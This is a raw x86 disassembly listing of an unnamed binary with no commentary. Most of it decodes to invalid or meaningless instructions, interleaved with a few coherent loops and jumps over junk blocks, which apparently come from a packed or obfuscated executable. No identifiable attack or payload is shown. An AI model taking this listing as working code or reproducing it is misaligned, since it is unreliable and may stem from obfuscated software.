  40ce58:	xor    BYTE PTR [eax-0x527525ad],dh
  40ce5e:	inc    ecx
  40ce5f:	mov    ebx,0x5d74a8cb
  40ce64:	cld    
  40ce65:	xchg   edi,eax
  40ce66:	cmp    cl,BYTE PTR [ecx-0x51903c87]
  40ce6c:	inc    ebx
  40ce6d:	push   ecx
  40ce6e:	cmp    ah,BYTE PTR [edi+edx*2+0x3217d24b]
  40ce75:	sub    DWORD PTR [ebp-0x64],ebp
  40ce78:	xchg   ecx,eax
  40ce79:	(bad)  
  40ce7a:	out    0x82,eax
  40ce7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce7d:	fsubr  st(6),st
  40ce7f:	or     DWORD PTR [eax+0x1e],ebp
  40ce82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce83:	les    edi,FWORD PTR [ecx+0x3c]
  40ce86:	(bad)  
  40ce87:	aaa    
  40ce88:	cmp    edi,DWORD PTR [edx]
  40ce8a:	mov    ebp,0xfe5022
  40ce8f:	imul   DWORD PTR [ebp+0x53]
  40ce92:	add    al,0x84
  40ce94:	sbb    dh,bh
  40ce96:	scas   al,BYTE PTR es:[edi]
  40ce97:	out    0xd0,al
  40ce99:	mov    dh,0xad
  40ce9b:	aaa    
  40ce9c:	inc    ecx
  40ce9d:	push   edx
  40ce9e:	retf   
  40ce9f:	mov    bx,0x8aa5
  40cea3:	mov    eax,ds:0x6d8daa2c
  40cea8:	jmp    0xab5e9249
  40cead:	test   esp,0x4b515971
  40ceb3:	or     DWORD PTR ds:0xc02b894a,esp
  40ceb9:	fs out 0x5d,eax
  40cebc:	or     BYTE PTR [eax+0x70],ah
  40cebf:	jmp    0x40ce92
  40cec1:	cmp    al,0xe8
  40cec3:	clc    
  40cec4:	pop    esp
  40cec5:	mov    edx,0x34a8a9e8
  40ceca:	jb     0x40cf06
  40cecc:	jg     0x40cec6
  40cece:	cli    
  40cecf:	icebp  
  40ced0:	fs or  al,0x7f
  40ced3:	out    dx,eax
  40ced4:	mov    dh,0xbb
  40ced6:	or     esp,esp
  40ced8:	pop    ecx
  40ced9:	mov    ecx,0x70e4ffb1
  40cede:	scas   eax,DWORD PTR es:[edi]
  40cedf:	in     al,0x7c
  40cee1:	stos   DWORD PTR es:[edi],eax
  40cee2:	retf   0x12
  40cee5:	in     eax,0x3
  40cee7:	inc    esp
  40cee8:	(bad)  [edi]
  40ceea:	jmp    0x40ce74
  40ceec:	xlat   BYTE PTR ds:[ebx]
  40ceed:	sub    al,cl
  40ceef:	mov    ebx,0x40c99105
  40cef4:	or     DWORD PTR [edx],ebx
  40cef6:	jmp    0x40cf34
  40cef8:	or     bh,BYTE PTR [ebp+0x27]
  40cefb:	sub    al,0x91
  40cefd:	dec    eax
  40cefe:	retf   0x97e0
  40cf01:	mov    cl,0xc9
  40cf03:	sub    eax,0xe4a61297
  40cf08:	xchg   ebx,eax
  40cf09:	sbb    al,0x6b
  40cf0b:	and    DWORD PTR [ebx-0x58199d46],0xffffffd6
  40cf12:	icebp  
  40cf13:	test   eax,0xc27c659c
  40cf18:	xlat   BYTE PTR ds:[ebx]
  40cf19:	xchg   BYTE PTR [eax],cl
  40cf1b:	dec    esi
  40cf1c:	dec    ebx
  40cf1d:	add    eax,0x93766752
  40cf22:	inc    al
  40cf24:	mov    ds:0x25aab8af,al
  40cf29:	mov    al,ds:0xf09121ee
  40cf2e:	pop    ds
  40cf2f:	in     eax,dx
  40cf30:	(bad)  
  40cf31:	jmp    0x50ae:0xd7885d66
  40cf38:	push   cs
  40cf39:	fcomp  QWORD PTR cs:[ebp+0x0]
  40cf3d:	jbe    0x40cf2b
  40cf3f:	sbb    DWORD PTR [esi+0x45],ebx
  40cf42:	sbb    DWORD PTR [ebx-0x19742f6c],ebx
  40cf48:	cdq    
  40cf49:	neg    DWORD PTR [ecx+0x7717837f]
  40cf4f:	mov    edi,0xccf12194
  40cf54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf55:	icebp  
  40cf56:	xchg   esi,eax
  40cf57:	test   al,0xf7
  40cf59:	pop    esi
  40cf5a:	jae    0x40cf51
  40cf5c:	add    bl,BYTE PTR ds:0x1b28eb3c
  40cf62:	mov    ebp,0x4679a730
  40cf67:	dec    edi
  40cf68:	xchg   ebx,eax
  40cf69:	jg     0x40cf11
  40cf6b:	pop    ecx
  40cf6c:	add    DWORD PTR [edx],ebp
  40cf6e:	push   edi
  40cf6f:	daa    
  40cf70:	push   ecx
  40cf71:	mov    eax,0x1f4f77eb
  40cf76:	int    0x1d
  40cf78:	jnp    0x40cf43
  40cf7a:	inc    ebp
  40cf7b:	add    al,0xf7
  40cf7d:	sahf   
  40cf7e:	nop
  40cf7f:	test   al,0xb8
  40cf81:	mov    esi,0x53da869f
  40cf86:	into   
  40cf87:	cmp    eax,0x6a2da88f
  40cf8c:	je     0x40b5e7
  40cf92:	mov    eax,0x800f1c81
  40cf97:	jmp    0x40b5ee
  40cf9c:	push   ebp
  40cf9d:	mov    ebp,esp
  40cf9f:	sub    esp,0x60
  40cfa2:	sbb    DWORD PTR ds:0x42a845,0x18d1
  40cfac:	mov    eax,DWORD PTR [ebp+0x8]
  40cfaf:	xor    DWORD PTR ds:0x42a879,0x42a75d
  40cfb9:	jmp    0x40d211
  40cfbe:	ror    esp,1
  40cfc0:	mov    dh,0xc5
  40cfc3:	fcmovbe st,st(1)
  40cfc5:	(bad)  [esi]
  40cfc7:	push   ds
  40cfc8:	aad    0x62
  40cfca:	push   es
  40cfcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfcc:	mov    ebp,0x78a72ad2
  40cfd1:	js     0x40d008
  40cfd3:	jle    0x40d04d
  40cfd5:	js     0x40cfc4
  40cfd7:	icebp  
  40cfd8:	jne    0x40d015
  40cfda:	repnz shr BYTE PTR [eax],cl
  40cfdd:	loop   0x40d059
  40cfdf:	stc    
  40cfe0:	push   esp
  40cfe1:	out    dx,eax
  40cfe2:	sub    al,0xd
  40cfe4:	pop    esp
  40cfe5:	cwde   
  40cfe6:	mov    al,ds:0xc624779d
  40cfeb:	daa    
  40cfec:	into   
  40cfed:	dec    ecx
  40cfee:	cmp    esi,DWORD PTR [ecx+0x486dee2d]
  40cff4:	mov    dl,0x9a
  40cff6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cff7:	pop    esi
  40cff8:	or     eax,ecx
  40cffa:	cmp    ah,BYTE PTR [eax+ecx*2]
  40cffd:	dec    eax
  40cffe:	lahf   
  40cfff:	aam    0x3a
  40d001:	ja     0x40d017
  40d003:	add    esi,DWORD PTR [edx-0x5dc9759a]
  40d009:	push   0x919a6133
  40d00e:	loope  0x40d050
  40d010:	pop    ecx
  40d011:	mov    dh,0x41
  40d013:	repnz add BYTE PTR [ecx+0x3a11140],dl
  40d01a:	test   edx,edi
  40d01c:	iret   
  40d01d:	push   esp
  40d01e:	jp     0x40d05f
  40d020:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d021:	xchg   ebp,eax
  40d022:	retf   0x1ce3
  40d025:	ror    ebx,1
  40d027:	inc    esp
  40d028:	mov    ds:0x551e49ba,eax
  40d02d:	in     al,0x8f
  40d02f:	jno    0x40cfef
  40d031:	inc    esi
  40d032:	js     0x40d07c
  40d034:	adc    dl,BYTE PTR [ebx]
  40d036:	not    DWORD PTR [ecx-0x3191c483]
  40d03c:	mov    ds:0x3064809b,eax
  40d041:	stos   DWORD PTR es:[edi],eax
  40d042:	mov    esp,0xb45657aa
  40d047:	out    0xb0,eax
  40d049:	inc    ecx
  40d04a:	xchg   esp,eax
  40d04b:	add    eax,0x8efaf95d
  40d050:	adc    eax,0x4a648d7b
  40d055:	mov    ebp,0x34fd5fd9
  40d05a:	mov    dl,0x56
  40d05c:	rcl    BYTE PTR [eax],0x7
  40d05f:	push   ds
  40d060:	jae    0x40d06f
  40d062:	(bad)  
  40d063:	aad    0xca
  40d065:	or     al,0x52
  40d067:	lock pop eax
  40d069:	mov    ah,0xdd
  40d06b:	stos   DWORD PTR es:[edi],eax
  40d06c:	xor    DWORD PTR [edx],0x6c
  40d06f:	aad    0xe7
  40d071:	or     WORD PTR [bx-0x4b],ax
  40d076:	or     ecx,ebx
  40d078:	add    dl,BYTE PTR [edx+0x1a77a5bc]
  40d07e:	sbb    ah,bl
  40d080:	push   ss
  40d081:	mov    DWORD PTR [ebx-0x2c56728e],esi
  40d087:	pop    ebp
  40d088:	stos   BYTE PTR es:[edi],al
  40d089:	push   cs
  40d08a:	test   esi,eax
  40d08c:	(bad)  [edi-0x7b4edbf3]
  40d092:	fucomp st(2)
  40d094:	push   edx
  40d095:	xchg   BYTE PTR [ebx-0x78],ah
  40d098:	jbe    0x40d093
  40d09a:	cmp    al,BYTE PTR [edi]
  40d09c:	sbb    al,0x22
  40d09e:	pop    ebp
  40d09f:	mov    esp,0xf8cd807c
  40d0a4:	(bad)  
  40d0a5:	jge    0x40d074
  40d0a7:	jae    0x40d0f7
  40d0a9:	cli    
  40d0aa:	push   ds
  40d0ab:	dec    ebp
  40d0ac:	leave  
  40d0ad:	cmp    DWORD PTR [edx],0xbba4a937
  40d0b3:	sub    al,0xdc
  40d0b5:	sub    dl,BYTE PTR [ebp+0x7d192c4d]
  40d0bb:	ss adc al,0xff
  40d0be:	or     al,0x9a
  40d0c0:	rcl    BYTE PTR [esi+eax*8],0x97
  40d0c4:	pop    esp
  40d0c5:	call   0xd71be733
  40d0ca:	out    0xbe,al
  40d0cc:	xchg   edi,eax
  40d0cd:	xor    ebp,ecx
  40d0cf:	cmp    ebx,edi
  40d0d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0d2:	add    ebp,DWORD PTR [eax+0x59]
  40d0d5:	je     0x40d082
  40d0d7:	ins    DWORD PTR es:[edi],dx
  40d0d8:	outs   dx,DWORD PTR ds:[esi]
  40d0d9:	ret    0x2f5a
  40d0dc:	mov    ?,ecx
  40d0de:	daa    
  40d0df:	jg     0x40d0df
  40d0e1:	mov    ebp,0xc3f60543
  40d0e6:	data16 adc BYTE PTR ds:0xe2f984ee,ch
  40d0ed:	cmc    
  40d0ee:	rcl    DWORD PTR [eax+ebx*8+0xd],1
  40d0f2:	jge    0x40d114
  40d0f4:	std    
  40d0f5:	mov    ds:0x6d985f74,al
  40d0fa:	xchg   edx,eax
  40d0fb:	push   ebp
  40d0fc:	add    BYTE PTR [ecx+ebx*1],dh
  40d0ff:	sti    
  40d100:	stc    
  40d101:	stos   BYTE PTR es:[edi],al
  40d102:	inc    esi
  40d103:	sub    bl,BYTE PTR [edi]
  40d105:	inc    esi
  40d106:	dec    esi
  40d107:	into   
  40d108:	and    edx,esp
  40d10a:	push   cs
  40d10b:	mov    al,0xe0
  40d10d:	repnz fld st(5)
  40d110:	xchg   ecx,eax
  40d111:	push   ecx
  40d112:	push   ebp
  40d113:	mov    dh,0x42
  40d115:	jno    0x40d0b7
  40d117:	jle    0x40d137
  40d119:	fdiv   st(4),st
  40d11b:	pop    ss
  40d11c:	pop    esi
  40d11d:	adc    eax,0x19111fce
  40d122:	in     eax,dx
  40d123:	cmp    esp,DWORD PTR ds:0x3398cd7f
  40d129:	int    0x87
  40d12b:	(bad)  
  40d12c:	frstor [ebx]
  40d12e:	outs   dx,DWORD PTR ds:[esi]
  40d12f:	out    dx,eax
  40d130:	adc    BYTE PTR [edi],cl
  40d132:	add    al,0x8b
  40d134:	jp     0x40d124
  40d136:	mov    dl,0x4d
  40d138:	popa   
  40d139:	fisttp QWORD PTR [eax+0x69]
  40d13c:	mov    DWORD PTR [eax],ebp
  40d13e:	sub    eax,0x23ca2a06
  40d143:	imul   esp,DWORD PTR [ecx+0x3b],0x5c
  40d147:	scas   eax,DWORD PTR es:[edi]
  40d148:	int3   
  40d149:	cwde   
  40d14a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d14b:	mov    BYTE PTR [ebx+0x4cc2e074],al
  40d151:	cmp    DWORD PTR [ebp-0x1b],esp
  40d154:	push   es
  40d155:	loop   0x40d146
  40d157:	mov    ss,WORD PTR [esi]
  40d159:	shr    BYTE PTR [ecx+0x48],cl
  40d15c:	mov    ebx,0x354f6376
  40d161:	data16 or dh,BYTE PTR [eax+eax*8-0x3b64c067]
  40d169:	fwait
  40d16a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d16b:	sbb    BYTE PTR [edi-0x256e47b1],dh
  40d171:	pop    esp
  40d172:	push   edi
  40d173:	cs in  eax,dx
  40d175:	and    dl,bh
  40d177:	test   al,0x8f
  40d179:	mov    eax,0xcdbe5d61
  40d17e:	xchg   ebp,eax
  40d17f:	fsubr  st,st(1)
  40d181:	mov    bl,0x5c
  40d183:	adc    DWORD PTR [edx+0x19a67812],esi
  40d189:	gs jnp 0x40d1b3
  40d18c:	fwait
  40d18d:	cmp    edx,DWORD PTR [ebp+0x7defaaee]
  40d193:	stc    
  40d194:	fstp   TBYTE PTR [edi]
  40d196:	or     BYTE PTR fs:[eax],al
  40d199:	stos   BYTE PTR es:[edi],al
  40d19a:	push   ebx
  40d19b:	fs push cs
  40d19d:	shl    bh,cl
  40d19f:	call   0x184b433a
  40d1a4:	sbb    BYTE PTR [ecx-0x564ee0ab],ah
  40d1aa:	mov    eax,DWORD PTR [ebp-0x6a]
  40d1ad:	scas   al,BYTE PTR es:[edi]
  40d1ae:	jmp    0xfd2c:0xb0955751
  40d1b5:	mov    ds:0xddf5130f,al
  40d1ba:	xor    BYTE PTR [esi-0x42],0xa7
  40d1be:	jmp    0x40d1f7
  40d1c0:	mov    DWORD PTR [esi-0x61],esi
  40d1c3:	outs   dx,DWORD PTR ds:[esi]
  40d1c4:	or     DWORD PTR [edx-0x2a5bc95b],esi
  40d1ca:	pop    es
  40d1cb:	push   esp
  40d1cc:	pop    eax
  40d1cd:	out    dx,eax
  40d1ce:	stos   DWORD PTR es:[edi],eax
  40d1cf:	cmp    eax,DWORD PTR [esi-0x64105930]
  40d1d5:	icebp  
  40d1d6:	scas   eax,DWORD PTR es:[edi]
  40d1d7:	and    eax,esp
  40d1d9:	mov    ch,0x80
  40d1db:	xchg   BYTE PTR ds:0x6da11c3b,dl
  40d1e1:	sub    esi,0xffffffcd
  40d1e4:	pop    eax
  40d1e5:	lds    edi,FWORD PTR [eax]
  40d1e7:	inc    ebx
  40d1e8:	imul   DWORD PTR [eax]
  40d1ea:	xchg   esi,eax
  40d1eb:	ficom  WORD PTR [edx]
  40d1ed:	sbb    DWORD PTR [ebx-0x3b513470],ecx
  40d1f3:	or     BYTE PTR [ecx+0x6bbdbb11],cl
  40d1f9:	mov    al,ds:0xde3f71be
  40d1fe:	adc    al,0xc4
  40d200:	jge    0x40d1f1
  40d202:	fsubr  DWORD PTR [eax+0x3c93cd30]
  40d208:	jmp    0x9262ef8
  40d20d:	jae    0x40d230
  40d20f:	lahf   
  40d210:	or     dl,BYTE PTR [ebx+0x56]
  40d213:	and    DWORD PTR ds:0x42a7b5,0x0
  40d21d:	jmp    0x40d22f
  40d222:	mov    ebx,DWORD PTR ds:0x42a7b5
  40d228:	inc    ebx
  40d229:	mov    DWORD PTR ds:0x42a7b5,ebx
  40d22f:	cmp    DWORD PTR ds:0x42a7b5,0x1d
  40d236:	jae    0x40d254
  40d23c:	cmp    DWORD PTR ds:0x42a7b5,0x26
  40d243:	jne    0x40d24f
  40d249:	call   DWORD PTR ds:0x41d24c
  40d24f:	jmp    0x40d222
  40d254:	mov    esi,0x7510850
  40d259:	movzx  ebx,WORD PTR ds:0x42a775
  40d260:	xor    ebx,DWORD PTR ds:0x42a75d
  40d266:	mov    DWORD PTR ds:0x42a775,ebx
  40d26c:	xor    eax,esi
  40d26e:	or     ebx,0x7ad4
  40d274:	mov    ebx,0x327298
  40d279:	adc    DWORD PTR ds:0x42a7bd,0x42a879
  40d283:	add    eax,ebx
  40d285:	sub    DWORD PTR ds:0x42a889,0x2a37
  40d28f:	push   edi
  40d290:	mov    DWORD PTR [ebp-0x18],eax
  40d293:	adc    DWORD PTR ds:0x42a879,0x18
  40d29d:	mov    edi,DWORD PTR [ebp+0x8]
  40d2a0:	neg    DWORD PTR ds:0x42a845
  40d2a6:	xor    edi,esi
  40d2a8:	jmp    0x40d500
  40d2ad:	int    0xca
  40d2af:	iret   
  40d2b0:	retf   0xd9db
  40d2b3:	(bad)  
  40d2b5:	and    ah,ah
  40d2b7:	push   ecx
  40d2b8:	pusha  
  40d2b9:	push   eax
  40d2ba:	mov    ebx,0xa5e7f163
  40d2bf:	js     0x40d339
  40d2c1:	xor    eax,0x6378787e
  40d2c6:	int3   
  40d2c7:	jno    0x40d31e
  40d2c9:	push   esi
  40d2ca:	aaa    
  40d2cb:	mov    ecx,0x12a8e23a
  40d2d0:	int    0x24
  40d2d2:	ret    0xbeb5
  40d2d5:	aam    0x47
  40d2d7:	pop    ebp
  40d2d8:	cmp    al,0xb0
  40d2da:	sbb    BYTE PTR [esi+0x16],ah
  40d2dd:	leave  
  40d2de:	mov    eax,ds:0x74a0c924
  40d2e3:	scas   eax,DWORD PTR es:[edi]
  40d2e4:	and    al,0x5f
  40d2e7:	push   0xd7c78814
  40d2ec:	mov    bl,0x10
  40d2ee:	add    ebp,DWORD PTR [ebx-0x413edc5]
  40d2f4:	xchg   DWORD PTR [ebx-0x7],eax
  40d2f7:	sub    esi,edi
  40d2f9:	sbb    al,0xce
  40d2fb:	dec    al
  40d2fd:	pop    ss
  40d2fe:	gs mov edi,0x2cc039bd
  40d304:	fdiv   QWORD PTR [edi-0xb]
  40d307:	mov    edi,0x401a8c8f
  40d30c:	fs push ebx
  40d30e:	mov    ebp,0x574584b4
  40d313:	push   ebp
  40d314:	inc    ecx
  40d315:	scas   al,BYTE PTR es:[edi]
  40d316:	mov    edx,0xcab33b8c
  40d31b:	cs push esp
  40d31d:	pop    edx
  40d31e:	loop   0x40d34b
  40d320:	add    al,0x95
  40d322:	push   ebp
  40d323:	push   cs
  40d324:	cmp    BYTE PTR [esi+0x1232957c],0x8e
  40d32b:	xor    eax,0xeb7559d5
  40d330:	dec    edx
  40d331:	mov    edx,0x99f0635f
  40d336:	mov    ds:0xaedb08bd,al
  40d33b:	in     eax,dx
  40d33c:	xchg   edi,eax
  40d33d:	cmp    DWORD PTR [edi+0x38],0x21109bd4
  40d344:	sti    
  40d345:	push   ebx
  40d346:	jb     0x40d358
  40d348:	fist   WORD PTR [ecx+0x1b]
  40d34b:	cmp    ebx,DWORD PTR [ebx-0x1b97c816]
  40d351:	inc    esp
  40d352:	sub    dh,dl
  40d354:	sbb    DWORD PTR [edi+0x6b],edi
  40d357:	or     dl,bl
  40d359:	sbb    ebx,DWORD PTR [esi-0x30]
  40d35c:	push   ds
  40d35d:	dec    esi
  40d35e:	cmp    BYTE PTR [ebx+0x72e31665],dl
  40d364:	sbb    bh,ch
  40d366:	cmp    al,0xa3
  40d368:	sub    eax,DWORD PTR [ecx-0x29ae8ecc]
  40d36e:	cdq    
  40d36f:	cmp    DWORD PTR [ebx-0x39],edx
  40d372:	mov    dh,0x88
  40d374:	jl     0x40d389
  40d376:	mov    esp,0xeb3bbd2a
  40d37b:	dec    ebp
  40d37c:	jne    0x40d32b
  40d37e:	adc    eax,0x65bf684e
  40d383:	xchg   ecx,eax
  40d384:	cmp    eax,0xc00ef93
  40d389:	es pop edx
  40d38b:	or     al,BYTE PTR [edx]
  40d38d:	mov    ?,WORD PTR [edi]
  40d38f:	call   0xaf90:0x538231e2
  40d396:	mov    eax,0xdd0bed7e
  40d39b:	std    
  40d39c:	je     0x40d40d
  40d39e:	add    ch,0x5d
  40d3a1:	popa   
  40d3a2:	sub    ecx,DWORD PTR [edi+eax*4]
  40d3a5:	dec    eax
  40d3a6:	rcr    DWORD PTR [ebp+0x75],1
  40d3a9:	adc    eax,0xf5554a9a
  40d3ae:	retf   0x8d0b
  40d3b1:	fwait
  40d3b2:	lock retf 0xec50
  40d3b6:	in     al,0x72
  40d3b8:	mov    ah,0x10
  40d3ba:	dec    ebx
  40d3bb:	es lock jge 0x40d36c
  40d3bf:	inc    esp
  40d3c0:	lock xchg DWORD PTR [edx+0x16],edx
  40d3c4:	dec    edi
  40d3c5:	mov    ecx,0x7133158
  40d3ca:	mov    ?,WORD PTR ds:[eax]
  40d3cd:	cmp    eax,0x791c7f86
  40d3d2:	mov    eax,0x63621810
  40d3d7:	repnz push esi
  40d3d9:	(bad)  
  40d3da:	push   ebp
  40d3db:	sub    ebx,DWORD PTR [eax]
  40d3dd:	sbb    BYTE PTR [edx+0x6b],0x25
  40d3e1:	mov    ebx,0xa602104
  40d3e6:	mov    BYTE PTR ds:0xc3f3e481,ch
  40d3ec:	mov    bh,0xba
  40d3ee:	pop    esp
  40d3ef:	or     eax,0xb6e5976f
  40d3f4:	das    
  40d3f5:	stos   BYTE PTR es:[edi],al
  40d3f6:	stos   BYTE PTR es:[edi],al
  40d3f7:	mov    edi,0x48950e2a
  40d3fc:	push   esi
  40d3fd:	jb     0x40d41d
  40d3ff:	push   eax
  40d400:	enter  0x4a43,0x81
  40d404:	retf   0x679e
  40d407:	dec    esp
  40d408:	sub    esi,edi
  40d40a:	mov    al,ds:0x2d96688d
  40d40f:	pop    edx
  40d410:	push   ebp
  40d411:	test   al,0x78
  40d413:	mov    ds:0x1369d597,eax
  40d418:	jecxz  0x40d47a
  40d41a:	(bad)  
  40d41b:	push   ds
  40d41c:	in     al,0x7c
  40d41e:	mov    ds:0xce058bc3,al
  40d423:	lds    esi,FWORD PTR [edi-0x40]
  40d426:	fst    st(4)
  40d428:	fnstcw WORD PTR ds:0x65046793
  40d42e:	into   
  40d42f:	lea    ecx,[edi]
  40d431:	and    eax,0xf56e2ffa
  40d436:	ror    DWORD PTR [edx],0x8d
  40d439:	mov    edi,0x3d757629
  40d43e:	push   ss
  40d43f:	repz iret 
  40d441:	je     0x40d44f
  40d443:	aaa    
  40d444:	leave  
  40d445:	add    dh,BYTE PTR [ebx]
  40d447:	add    ebp,DWORD PTR [ebx+ebx*8+0x43]
  40d44b:	add    al,0x3a
  40d44d:	dec    edx
  40d44e:	mov    bl,BYTE PTR [ebx+0x7800ab25]
  40d454:	je     0x40d435
  40d456:	dec    edi
  40d457:	mov    bh,0xf4
  40d459:	fimul  DWORD PTR [ecx-0x2c]
  40d45c:	inc    esp
  40d45d:	call   0x403f:0xf79271ce
  40d464:	sub    bl,BYTE PTR [esi-0x1a]
  40d467:	inc    ecx
  40d468:	pop    ebx
  40d469:	sub    eax,0x5f350e82
  40d46e:	cld    
  40d46f:	scas   eax,DWORD PTR es:[edi]
  40d470:	loope  0x40d4a4
  40d472:	jle    0x40d44c
  40d474:	xchg   esi,eax
  40d475:	xchg   edi,eax
  40d476:	dec    esp
  40d477:	(bad)
  40d47a:	ror    DWORD PTR [ecx+0x5e913e4a],cl
  40d480:	cmp    BYTE PTR [esi+0x19b04563],ch
  40d486:	push   ebp
  40d487:	popf   
  40d488:	push   es
  40d489:	leave  
  40d48a:	repz sbb dl,bh
  40d48d:	mov    ah,0x4a
  40d48f:	pusha  
  40d490:	push   ecx
  40d491:	data16 jbe 0x40d430
  40d494:	dec    esi
  40d495:	in     eax,0x5f
  40d497:	pop    ds
  40d498:	std    
  40d499:	pop    esp
  40d49a:	xor    dl,BYTE PTR [ecx+eax*1]
  40d49d:	adc    ecx,ebx
  40d49f:	call   0xb4a0:0x3b5111b0
  40d4a6:	dec    esp
  40d4a7:	xchg   dh,dl
  40d4a9:	mov    esi,0xa0cc7fa3
  40d4ae:	sbb    dh,BYTE PTR [esp+esi*1]
  40d4b1:	jg     0x40d492
  40d4b3:	ret    0xf5a9
  40d4b6:	add    edi,DWORD PTR [eax+ecx*8]
  40d4b9:	mov    eax,0xe8ba604e
  40d4be:	mov    ebp,0xc00f7c7e
  40d4c3:	daa    
  40d4c4:	stos   DWORD PTR es:[edi],eax
  40d4c5:	inc    esp
  40d4c6:	cmp    edi,DWORD PTR [edx+0x5d]
  40d4c9:	pop    ecx
  40d4ca:	out    dx,eax
  40d4cb:	mov    edi,0xd87e52d9
  40d4d0:	ficom  DWORD PTR [ecx]
  40d4d2:	push   edi
  40d4d3:	cmp    BYTE PTR [esi],cl
  40d4d5:	ja     0x40d52a
  40d4d7:	stos   DWORD PTR es:[edi],eax
  40d4d8:	sbb    BYTE PTR [ebx-0x62],ah
  40d4db:	out    dx,eax
  40d4dc:	nop
  40d4dd:	out    dx,eax
  40d4de:	dec    edi
  40d4df:	jle    0x40d4b5
  40d4e1:	test   BYTE PTR [eax+ebx*2-0x792274],bl
  40d4e8:	push   ecx
  40d4e9:	outs   dx,BYTE PTR ds:[esi]
  40d4ea:	push   0xffffffc1
  40d4ec:	mov    ds:0xc35f2b95,eax
  40d4f1:	(bad)  
  40d4f2:	mov    dl,0x61
  40d4f4:	sti    
  40d4f5:	sbb    bh,cl
  40d4f7:	ds aaa 
  40d4f9:	imul   ebx,ebx,0x8f307bca
  40d4ff:	add    al,0xc7
  40d501:	inc    ebp
  40d502:	hlt    
  40d503:	clc    
  40d504:	test   DWORD PTR [eax+edi*8+0x38f045c7],ebx
  40d50b:	xchg   DWORD PTR [eax+edi*8-0x580ada7f],ebx
  40d512:	inc    edx
  40d513:	add    BYTE PTR ds:0x30042a8,al
  40d519:	sti    
  40d51a:	jmp    0x40e985
  40d51f:	cmp    edi,0x3f
  40d522:	jne    0x40d55a
  40d528:	mov    eax,0x337e
  40d52d:	mov    eax,ds:0x41e966
  40d532:	mov    eax,DWORD PTR [eax]
  40d534:	mov    DWORD PTR [ebp-0x14],eax
  40d537:	mov    eax,ds:0x41eb6e
  40d53c:	mov    DWORD PTR ds:0x42a769,0x45db
  40d546:	mov    eax,DWORD PTR [eax]
  40d548:	mov    DWORD PTR [ebp-0x18],eax
  40d54b:	mov    DWORD PTR ds:0x42a7cd,0x1d30
  40d555:	jmp    0x40e979
  40d55a:	mov    DWORD PTR ds:0x42a835,0x19ca
  40d564:	jmp    0x40d7bc
  40d569:	leave  
  40d56a:	ret    
  40d56b:	enter  0xd6c6,0xd9
  40d56f:	fld    st(3)
  40d571:	int    0x93
  40d573:	fdiv   st,st(0)
  40d575:	cmc    
  40d576:	mov    edx,0xab9c3ef8
  40d57b:	js     0x40d5f5
  40d57d:	xor    eax,0x1e78787e
  40d582:	loop   0x40d595
  40d584:	out    0x9d,eax
  40d586:	adc    BYTE PTR [edx-0x46042a59],bh
  40d58c:	shr    DWORD PTR [ebx],0x89
  40d58f:	xor    edi,ecx
  40d591:	lock mov ecx,0x70cf0c69
  40d597:	xor    ebx,DWORD PTR [edx-0x332ef16a]
  40d59d:	xor    al,0x35
  40d59f:	sub    DWORD PTR [eax+edi*2-0x2d],ebx
  40d5a3:	outs   dx,BYTE PTR fs:[esi]
  40d5a5:	cmp    bh,dl
  40d5a7:	jg     0x40d608
  40d5a9:	pusha  
  40d5aa:	fst    DWORD PTR [edx-0x3cfc6cfd]
  40d5b0:	jmp    0x40d5a4
  40d5b2:	sar    BYTE PTR [edi+0x2fb6111e],1
  40d5b8:	mov    ebp,0x1cdcfb19
  40d5bd:	jns    0x40d57a
  40d5bf:	hlt    
  40d5c0:	mov    ds:0xf300c29a,eax
  40d5c5:	call   0xc753:0x6cdd4aa3
  40d5cc:	jmp    DWORD PTR [ecx]
  40d5ce:	xchg   ebx,eax
  40d5cf:	rcl    BYTE PTR [ebx+0x4fdd3039],1
  40d5d5:	test   BYTE PTR [edi],0xf4
  40d5d8:	pop    eax
  40d5d9:	ret    
  40d5da:	sbb    DWORD PTR [ebx],ecx
  40d5dc:	cmp    DWORD PTR [edi-0x66],0x46ae2b2
  40d5e3:	add    DWORD PTR [eax-0x3c],edi
  40d5e6:	ret    
  40d5e7:	addr16 sti 
  40d5e9:	repnz aam 0x77
  40d5ec:	dec    esi
  40d5ed:	rcl    BYTE PTR [eax],cl
  40d5ef:	ret    
  40d5f0:	mov    eax,ds:0xfc7f42f3
  40d5f5:	and    bh,cl
  40d5f7:	cwde   
  40d5f8:	sbb    eax,0x98c45dfa
  40d5fd:	xchg   esi,esp
  40d5ff:	pop    ss
  40d600:	pop    ds
  40d601:	arpl   WORD PTR [ebx],ax
  40d603:	xchg   BYTE PTR [edx+edi*4-0x6b],ch
  40d607:	rcl    BYTE PTR [ebx],cl
  40d609:	mov    bl,dl
  40d60b:	xchg   ebx,eax
  40d60c:	sub    ch,BYTE PTR [eax+0x24]
  40d60f:	inc    ecx
  40d610:	sar    dh,0xb6
  40d613:	fwait
  40d614:	into   
  40d615:	push   edx
  40d616:	test   DWORD PTR [edi],ebx
  40d618:	out    dx,al
  40d619:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d61a:	cmc    
  40d61b:	repz ss mov ebx,0x8bb3ab5
  40d622:	mov    cl,0x81
  40d624:	push   cs
  40d625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d626:	scas   al,BYTE PTR es:[edi]
  40d627:	push   ss
  40d628:	inc    ebp
  40d629:	xchg   DWORD PTR [ebx+0x48b7363e],edi
  40d62f:	sahf   
  40d630:	out    dx,al
  40d631:	ror    BYTE PTR [edi],1
  40d633:	repnz pop esp
  40d635:	arpl   WORD PTR [ebp+0x797b8613],cx
  40d63b:	adc    al,0xe0
  40d63d:	lea    edi,[eax-0x2d8a1a26]
  40d643:	sbb    esp,DWORD PTR [edx-0x780410e]
  40d649:	jmp    0x4eab:0xdf8bf54c
  40d650:	leave  
  40d651:	das    
  40d652:	push   es
  40d653:	sbb    DWORD PTR [ecx-0x31ebe98a],ecx
  40d659:	or     BYTE PTR [edi],bl
  40d65b:	int    0x63
